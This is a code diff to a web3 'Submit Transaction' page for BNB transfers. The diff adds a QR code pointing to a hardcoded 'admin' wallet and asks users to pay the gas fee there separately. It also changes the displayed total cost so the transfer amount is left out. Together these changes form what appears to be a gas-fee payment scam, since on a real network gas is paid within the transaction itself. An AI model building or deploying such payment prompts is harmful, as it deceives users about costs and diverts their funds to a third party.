@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Submit Transaction</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -26,6 +27,11 @@
       padding: 15px;
       border-radius: 8px;
     }
+    #qrCode {
+      margin-top: 20px;
+      width: 200px;
+      height: 200px;
+    }
   </style>
 </head>
 <body>
@@ -38,6 +44,12 @@
     <p><strong>Gas Fee:</strong> <span id="gasFee"></span></p>
     <p><strong>Total Transaction Cost:</strong> <span id="totalCost"></span></p>
     <button onclick="submitTransaction()">Submit Transaction</button>
+  </div>
+
+  <div class="info" id="gasPaymentOptions" style="display: none;">
+    <h3>Pay Gas Fee</h3>
+    <p>Scan the QR code to pay the gas fee:</p>
+    <div id="qrCode"></div>
   </div>
 
   <script>
@@ -55,6 +67,7 @@
 
       if (signedTransaction) {
         displayTransactionInfo(signedTransaction);
+        showGasPaymentOptions();
       } else {
         alert("No signed transaction found.");
       }
@@ -65,22 +78,32 @@
       document.getElementById('receiverAddress').innerText = transaction.to;
       document.getElementById('transactionAmount').innerText = web3.utils.fromWei(transaction.value, 'ether') + ' BNB';
       document.getElementById('gasFee').innerText = web3.utils.fromWei(transaction.gasPrice, 'ether') + ' BNB';
-      document.getElementById('totalCost').innerText = (parseFloat(web3.utils.fromWei(transaction.value, 'ether')) + parseFloat(web3.utils.fromWei(transaction.gasPrice, 'ether'))).toFixed(6) + ' BNB';
+      document.getElementById('totalCost').innerText = web3.utils.fromWei(transaction.gasPrice, 'ether') + ' BNB';
+
       document.getElementById('transactionInfo').style.display = 'block';
+    }
+
+    function showGasPaymentOptions() {
+      const gasPaymentAddress = '0x45D3b65a6938587c62c9a7580349eaEE940C8b29'; // Admin's gas fee wallet address
+      QRCode.toCanvas(document.getElementById('qrCode'), gasPaymentAddress, function(error) {
+        if (error) {
+          console.error(error);
+        }
+      });
+
+      document.getElementById('gasPaymentOptions').style.display = 'block';
     }
 
     async function submitTransaction() {
       try {
-        const receipt = await web3.eth.sendSignedTransaction(signedTransaction.rawTransaction);
-        console.log("Transaction successful:", receipt);
-        alert("Transaction successfully submitted!");
+        await web3.eth.sendSignedTransaction(signedTransaction.rawTransaction);
+        alert("Transaction submitted successfully!");
       } catch (error) {
-        console.error("Error submitting transaction:", error);
-        alert("Error submitting the transaction.");
+        console.error("Error submitting the transaction", error);
+        alert("Failed to submit the transaction.");
       }
     }
 
-    // Initialize when page loads
     init();
   </script>
 </body>
